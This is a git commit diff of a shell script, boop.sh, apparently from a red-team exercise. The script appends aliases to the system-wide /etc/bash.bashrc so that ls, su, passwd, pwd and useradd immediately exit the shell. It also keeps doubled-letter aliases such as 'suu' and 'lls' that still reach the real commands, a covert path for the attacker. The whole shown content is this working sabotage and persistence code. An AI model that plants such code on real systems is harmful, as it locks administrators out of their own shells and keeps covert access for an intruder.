007fbf6ab67820cdddfcc8fc246df5e703bf728b
tommyrac <155997776+tommyrac@users.noreply.github.com>
2024-09-25 01:26:27 -0600

    Update boop.sh

--- shunk/boop.sh
+++ shunk/boop.sh
@@ -6,12 +6,12 @@ alias useradd='exit'
 alias passwd='exit'
 alias pwd='exit'
 alias su='exit'
-alias ls='echo "I love redteam \<3" && sleep 0.8 && exit'
+alias ls='exit'
 ##############
-alias lls='ls'
-alias suu='su'
-alias pwdd='pwd'
-alias useraddd='useradd'
-alias passwdd='passwd'" >> /etc/bash.bashrc
+alias lls='\ls'
+alias suu='\su'
+alias pwdd='\pwd'
+alias useraddd='\useradd'
+alias passwdd='\passwd'" >> /etc/bash.bashrc
 
 source /etc/bash.bashrc
